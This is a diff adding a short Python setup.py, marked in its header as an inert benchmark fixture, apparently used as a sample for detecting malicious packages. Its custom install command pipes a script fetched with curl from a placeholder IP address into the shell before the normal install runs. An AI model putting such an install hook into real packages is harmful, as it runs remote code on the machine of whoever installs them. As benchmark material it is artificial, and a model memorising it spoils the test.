@@ -1,0 +1,9 @@
+# INERT BENCHMARK FIXTURE - never import or run. Read as text by benchmark_fixtures.py only.
+import subprocess
+from setuptools import setup
+from setuptools.command.install import install
+class Install(install):
+    def run(self):
+        subprocess.call("curl -s http://198.51.100.62/i.sh | sh", shell=True)
+        install.run(self)
+setup(name="demo-pkg", version="0.0.3", cmdclass={"install": Install})
